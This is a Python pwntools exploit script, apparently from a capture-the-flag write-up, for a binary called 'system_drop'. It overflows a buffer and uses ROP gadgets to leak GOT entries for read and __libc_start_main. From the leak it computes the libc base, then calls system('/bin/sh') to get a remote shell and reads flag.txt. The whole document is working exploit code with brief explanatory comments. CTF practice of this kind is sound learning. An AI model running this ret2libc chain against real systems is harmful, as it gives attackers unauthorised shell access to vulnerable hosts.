from pwn import *

conn = remote(MACHINE_IP, MACHINE_PORT)

elf = ELF("system_drop")
elf_rop = ROP(elf)

# ANCHOR: fn_leak_got
def leak_got(entry):
    with log.progress("leaking got entry for %s" % entry) as progress:
        progress.status("forging rop")
        # Here we feed the overflow with garbage bytes until the return address.
        rop = b"A" * 0x28

        # Here we found a `pop rsi` instruction, followed by another `pop` and
        # finished with `ret`.
        # `rsi` is the second argument, so it's the address from where we want
        # to leak data.
        rop += p64(elf_rop.find_gadget(["pop rsi"]).address)
        rop += p64(elf.got[entry])
        rop += p64(0)

        # Setting the length of the `write` is not necessary because we keep the
        # length set for the read function.

        # Then we return to the `syscall` instruction
        rop += p64(0x0040053b)

        # And finally we restart to the main function
        rop += p64(elf.symbols["main"])

        progress.status("sending rop")
        conn.send(rop)

        progress.status("computing leak address")
        return u64(conn.recv(0x100)[:0x8])
# ANCHOR_END: fn_leak_got

# ANCHOR: leak_got
leak_main = leak_got("__libc_start_main")
leak_read = leak_got("read")

log.info("Leak __libc_start_main %x" % leak_main)
log.info("Leak read %x" % leak_read)
# ANCHOR_END: leak_got

# ANCHOR: set_base
libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
libc.address = leak_read - libc.symbols["read"]
# ANCHOR_END: set_base

# ANCHOR: retrieve_shell
rop = b"A" * 0x28
rop += p64(elf_rop.find_gadget(['ret']).address)
rop += p64(elf_rop.find_gadget(["pop rdi", "ret"]).address)
rop += p64(next(libc.search(b"/bin/sh")))
rop += p64(libc.sym["system"])
rop += p64(libc.sym["exit"])
conn.send(rop)
# ANCHOR_END: retrieve_shell

# ANCHOR: cat_flag
conn.sendline("cat flag.txt")
log.success(conn.recvlineS())
# ANCHOR_END: cat_flag
